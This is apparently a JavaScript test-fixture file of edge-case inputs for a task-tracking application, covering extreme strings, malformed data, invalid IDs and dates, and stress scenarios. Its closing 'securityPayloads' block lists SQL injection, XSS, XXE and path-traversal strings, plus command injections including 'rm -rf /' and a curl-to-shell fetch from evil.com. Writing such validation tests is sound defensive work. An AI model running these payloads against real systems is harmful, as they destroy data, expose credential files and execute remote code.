/**
 * Edge case test data for boundary conditions and unusual scenarios
 */

// Extreme string lengths
export const extremeStrings = {
	empty: '',
	single: 'a',
	veryLong: 'a'.repeat(10000),
	maxLength: 'x'.repeat(65535), // Common DB varchar max
	unicode: '🚀'.repeat(100) + '测试' + '🎯'.repeat(100),
	specialChars: '!@#$%^&*()_+-=[]{}|;\':",./<>?`~',
	sqlInjection: "'; DROP TABLE tasks; --",
	scriptInjection: '<script>alert("XSS")</script>',
	nullBytes: 'test\x00null\x00bytes',
	whitespace: '   \t\n\r   ',
	rtl: 'مرحبا بالعالم', // Right-to-left text
	zalgo: 'ẗ̸̢̙̪͈̰̯̮̪̟̬̯̙̘̺̺̱̦͔̤̫̰̙͔̻͈̱̼̼̗͈̰̫̹̟̯̹̺̟̣̫̣͇͕̪̰̦̬͉̦̬̘̫̻̬̻̱͉̯̙̯̗̮͕̻̼̱̗̙̯̤͇̣̰͇̻̫̻̣̙̗̻̼̱̗̙̯̤͇̻̫̻̣̙̗e̸̢̙̪͈̰̯̮̪̟̬̯̙̘̺̺̱̦͔̤̫̰̙͔̻͈̱̼̼̗͈̰̫̹̟̯̹̺̟̣̫̣͇͕̪̰̦̬͉̦̬̘̫̻̬̻̱͉̯̙̯̗̮͕̻̼̱̗̙̯̤͇̣̰͇̻̫̻̣̙̗̻̼̱̗̙̯̤͇̻̫̻̣̙̗s̸̢̙̪͈̰̯̮̪̟̬̯̙̘̺̺̱̦͔̤̫̰̙͔̻͈̱̼̼̗͈̰̫̹̟̯̹̺̟̣̫̣͇͕̪̰̦̬͉̦̬̘̫̻̬̻̱͉̯̙̯̗̮͕̻̼̱̗̙̯̤͇̣̰͇̻̫̻̣̙̗̻̼̱̗̙̯̤͇̻̫̻̣̙̗t̸̢̙̪͈̰̯̮̪̟̬̯̙̘̺̺̱̦͔̤̫̰̙͔̻͈̱̼̼̗͈̰̫̹̟̯̹̺̟̣̫̣͇͕̪̰̦̬͉̦̬̘̫̻̬̻̱͉̯̙̯̗̮͕̻̼̱̗̙̯̤͇̣̰͇̻̫̻̣̙̗̻̼̱̗̙̯̤͇̻̫̻̣̙̗'
};

// Extreme numbers
export const extremeNumbers = {
	zero: 0,
	negative: -1,
	veryLarge: Number.MAX_SAFE_INTEGER,
	verySmall: Number.MIN_SAFE_INTEGER,
	infinity: Infinity,
	negativeInfinity: -Infinity,
	nan: NaN,
	float: 3.14159265359,
	scientific: 1.23e-10,
	hex: 0xff,
	binary: 0b1010,
	octal: 0o777
};

// Malformed data
export const malformedData = {
	notJson: 'This is not JSON',
	truncatedJson: '{"id": "task_001", "title": "Test',
	circularReference: (() => {
		const obj = { id: 'task_001' };
		obj.self = obj;
		return obj;
	})(),
	deeplyNested: JSON.parse(
		'{' + '"a":{'.repeat(100) + '"value":1' + '}'.repeat(100) + '}'
	),
	mixedTypes: {
		id: ['should', 'be', 'string'],
		priority: 'should be number',
		dependencies: 'should be array',
		subtasks: { should: 'be array' }
	}
};

// Edge case tasks
export const edgeCaseTasks = {
	// Task with empty/minimal data
	minimalTask: {
		id: 'task_001',
		title: 'a',
		description: '',
		status: 'pending',
		priority: 'low',
		dependencies: [],
		subtasks: []
	},

	// Task with maximum data
	maximalTask: {
		id: 'task_' + '9'.repeat(10),
		title: 'T'.repeat(1000),
		description: 'D'.repeat(5000),
		status: 'completed',
		priority: 'critical',
		dependencies: Array.from(
			{ length: 100 },
			(_, i) => `task_${String(i).padStart(3, '0')}`
		),
		subtasks: Array.from({ length: 100 }, (_, i) => ({
			id: `sub_${i}`,
			title: `Subtask ${i}`,
			completed: i % 2 === 0
		})),
		reasoning: 'R'.repeat(2000),
		metadata: {
			nested: {
				deeply: {
					nested: {
						value: 'deep'
					}
				}
			}
		}
	},

	// Task with special characters
	specialCharsTask: {
		id: 'task_001',
		title: '🚀 Test "Task" with \'quotes\' & <tags>',
		description: 'Description with\nnewlines\tand\ttabs',
		status: 'pending',
		priority: 'medium',
		dependencies: [],
		subtasks: [
			{
				id: 'sub_001',
				title: '子任务 with 中文 and émojis 🎯',
				completed: false
			}
		]
	},

	// Task with invalid references
	invalidReferencesTask: {
		id: 'task_999',
		title: 'Task with invalid dependencies',
		description: 'This task refers to non-existent tasks',
		status: 'blocked',
		priority: 'high',
		dependencies: ['task_nonexistent', 'task_deleted', 'task_-1'],
		subtasks: []
	},

	// Self-referencing task
	selfReferencingTask: {
		id: 'task_001',
		title: 'Self-referencing task',
		description: 'This task depends on itself',
		status: 'pending',
		priority: 'medium',
		dependencies: ['task_001'], // Self reference
		subtasks: []
	},

	// Task with duplicate dependencies
	duplicateDependenciesTask: {
		id: 'task_005',
		title: 'Task with duplicate dependencies',
		description: 'Contains the same dependency multiple times',
		status: 'pending',
		priority: 'medium',
		dependencies: ['task_001', 'task_002', 'task_001', 'task_003', 'task_002'],
		subtasks: []
	},

	// Task with all fields null/undefined
	nullFieldsTask: {
		id: 'task_null',
		title: null,
		description: undefined,
		status: null,
		priority: undefined,
		dependencies: null,
		subtasks: undefined
	}
};

// Edge case IDs
export const edgeCaseIds = {
	valid: [
		'task_001',
		'task_999',
		'task_000',
		'TASK_001',
		'task-001',
		'task.001',
		'task_a1b2c3'
	],
	invalid: [
		'',
		' ',
		'task_',
		'_001',
		'task',
		'001',
		'task_00a',
		'task_-01',
		'task_1.5',
		'task_001_extra',
		'../task_001',
		'task_001\n',
		'task_001\x00',
		'task_001; DROP TABLE tasks;',
		'task_001<script>',
		null,
		undefined,
		123,
		{},
		[],
		true
	]
};

// Edge case statuses and priorities
export const edgeCaseEnums = {
	validStatuses: ['pending', 'in-progress', 'completed', 'blocked'],
	invalidStatuses: [
		'',
		'PENDING',
		'Pending',
		'done',
		'cancelled',
		'invalid',
		null,
		123,
		true
	],
	validPriorities: ['low', 'medium', 'high', 'critical'],
	invalidPriorities: [
		'',
		'LOW',
		'Low',
		'urgent',
		'none',
		'highest',
		null,
		0,
		false
	]
};

// Edge case arrays
export const edgeCaseArrays = {
	empty: [],
	single: ['task_001'],
	large: Array.from(
		{ length: 1000 },
		(_, i) => `task_${String(i).padStart(3, '0')}`
	),
	nested: [['task_001'], ['task_002'], ['task_003']],
	mixed: ['task_001', 123, null, undefined, {}, [], true, 'task_002'],
	circular: (() => {
		const arr = ['task_001'];
		arr.push(arr);
		return arr;
	})()
};

// Edge case dates
export const edgeCaseDates = {
	valid: [
		new Date().toISOString(),
		'2024-01-01T00:00:00Z',
		'2024-12-31T23:59:59Z',
		'2024-01-01T00:00:00.000Z',
		'2024-01-01T00:00:00+00:00'
	],
	invalid: [
		'',
		'not a date',
		'2024-13-01T00:00:00Z', // Invalid month
		'2024-01-32T00:00:00Z', // Invalid day
		'2024-01-01T25:00:00Z', // Invalid hour
		'2024-01-01', // Missing time
		'2024/01/01', // Wrong format
		Date.now(), // Timestamp instead of ISO string
		null,
		undefined
	],
	extreme: [
		'1900-01-01T00:00:00Z', // Very old
		'2100-12-31T23:59:59Z', // Far future
		'1970-01-01T00:00:00Z', // Unix epoch
		'2038-01-19T03:14:07Z' // Y2K38 problem
	]
};

// Concurrent modification scenarios
export const concurrentModifications = [
	{
		operation: 'update',
		taskId: 'task_001',
		user1Changes: { title: 'User 1 Title', priority: 'high' },
		user2Changes: { title: 'User 2 Title', status: 'in-progress' },
		expectedConflict: true
	},
	{
		operation: 'delete-update',
		taskId: 'task_002',
		user1Action: 'delete',
		user2Changes: { title: 'Updated after delete' },
		expectedError: 'TASK_NOT_FOUND'
	},
	{
		operation: 'dependency-cycle',
		user1Changes: { taskId: 'task_003', dependencies: ['task_004'] },
		user2Changes: { taskId: 'task_004', dependencies: ['task_003'] },
		expectedError: 'CIRCULAR_DEPENDENCY'
	}
];

// Rate limiting test cases
export const rateLimitScenarios = {
	burst: {
		requests: 100,
		timeWindow: 1000, // 1 second
		expectedFailures: 90 // Assuming 10 req/sec limit
	},
	sustained: {
		requests: 60,
		timeWindow: 60000, // 1 minute
		expectedFailures: 0 // Within normal limits
	},
	spike: {
		pattern: [
			{ count: 50, delay: 0 }, // Initial spike
			{ count: 10, delay: 1000 }, // After 1 second
			{ count: 50, delay: 0 } // Another spike
		]
	}
};

// Memory stress test cases
export const memoryStressData = {
	// Generate a task with large text content
	largeTextTask: {
		id: 'task_large',
		title: 'Large task',
		description: 'X'.repeat(1000000), // 1MB of text
		status: 'pending',
		priority: 'low',
		dependencies: [],
		subtasks: Array.from({ length: 1000 }, (_, i) => ({
			id: `sub_${i}`,
			title: 'Y'.repeat(1000), // 1KB per subtask
			completed: false
		}))
	},

	// Binary data disguised as text
	binaryDataTask: {
		id: 'task_binary',
		title: Buffer.from([0xff, 0xfe, 0xfd]).toString('base64'),
		description: Buffer.from(new Uint8Array(1000)).toString('base64'),
		status: 'pending',
		priority: 'medium',
		dependencies: [],
		subtasks: []
	}
};

// Security test payloads
export const securityPayloads = {
	sql: [
		"'; DROP TABLE tasks; --",
		"1' OR '1'='1",
		"admin'--",
		'1; DELETE FROM tasks WHERE 1=1; --',
		"' UNION SELECT * FROM users; --"
	],
	xss: [
		'<script>alert("XSS")</script>',
		'<img src=x onerror=alert("XSS")>',
		'<svg onload=alert("XSS")>',
		'javascript:alert("XSS")',
		'<iframe src="javascript:alert(\'XSS\')"></iframe>'
	],
	xxe: [
		'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
		'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]>'
	],
	pathTraversal: [
		'../../../etc/passwd',
		'..\\..\\..\\windows\\system32\\config\\sam',
		'task_001/../../../secrets',
		'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
	],
	commandInjection: [
		'; ls -la',
		'| cat /etc/passwd',
		'`rm -rf /`',
		'$(curl http://evil.com/shell.sh | sh)'
	]
};
